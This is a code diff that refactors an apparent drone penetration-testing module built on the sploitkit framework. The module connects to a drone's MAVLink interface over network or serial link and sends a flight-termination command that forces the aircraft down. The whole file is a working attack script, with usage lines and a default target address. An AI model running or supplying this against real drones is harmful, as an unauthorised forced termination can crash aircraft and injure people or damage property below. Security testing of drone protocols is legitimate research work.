@@ -1,32 +1,30 @@
-from sploitkit import Module, Config, Option
+from sploitkit import Config
+from lib.base import MAVLinkModule
 from pymavlink import mavutil
 import sys
 
-class FlightTermination(Module):
-    """Forcefully terminate the drone's flight"""
+class FlightTermination(MAVLinkModule):
+    """
+    Forcefully terminate the drone's flight.
 
-    # Configuration for the scanner module
-    config = Config({
-        Option(
-            name='target_ip',
-            description='IP of your target drone',
-            required=True,
-            ): "10.13.0.3", # Default value
-        Option(
-            name='target_port',
-            description='MavLink Port',
-            required=True,
-            ): "5760",  # Default value
-    })
+    Connection:
+        Supports both network and serial connections:
+        - Network: udp:192.168.1.1:14550 or tcp:192.168.1.1:5760
+        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)
 
-    def connect_drone(self, target_ip, target_port):
-        """
-        Establish a connection to the drone.
-        """
-        master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-        master.wait_heartbeat()
-        self.logger.info("Connected to the drone.")
-        return master
+    Usage:
+        set connection tcp:10.13.0.3:5760
+        run
+
+        OR
+
+        set connection /dev/ttyUSB0
+        set baud 57600
+        run
+    """
+
+    # Inherit connection config from base class
+    config = MAVLinkModule.config + Config({})
 
     def execute_flight_termination(self, master):
         """
@@ -43,26 +41,26 @@ class FlightTermination(Module):
         self.logger.info("Flight termination command sent.")
 
     def run(self):
-        # Retrieve the target IP and port from the config
-        target_ip = self.config['target_ip']
-        target_port = self.config['target_port']
+        # Connect to the drone using base class method (supports both serial and network)
+        master = self.connect_drone()
 
-        # Connect to the drone
-        master = self.connect_drone(target_ip, target_port)
+        try:
+            # Execute the flight termination
+            self.execute_flight_termination(master)
 
-        # Execute the flight termination
-        self.execute_flight_termination(master)
-
-        # Optionally, monitor the drone's status
-        while True:
-            msg = master.recv_match(blocking=True)
-            if not msg:
-                continue
-            self.logger.info(f"Received message: {msg}")
-            if msg.get_type() == 'COMMAND_ACK':
-                if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
-                    if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
-                        self.logger.success("Flight termination command accepted.")
-                    else:
-                        self.logger.failure(f"Failed to execute flight termination command: {msg.result}")
-                break
+            # Monitor the drone's status
+            while True:
+                msg = master.recv_match(blocking=True)
+                if not msg:
+                    continue
+                self.logger.info(f"Received message: {msg}")
+                if msg.get_type() == 'COMMAND_ACK':
+                    if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
+                        if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
+                            self.logger.success("Flight termination command accepted.")
+                        else:
+                            self.logger.failure(f"Failed to execute flight termination command: {msg.result}")
+                    break
+        finally:
+            # Clean up connection
+            self.close_connection(master)
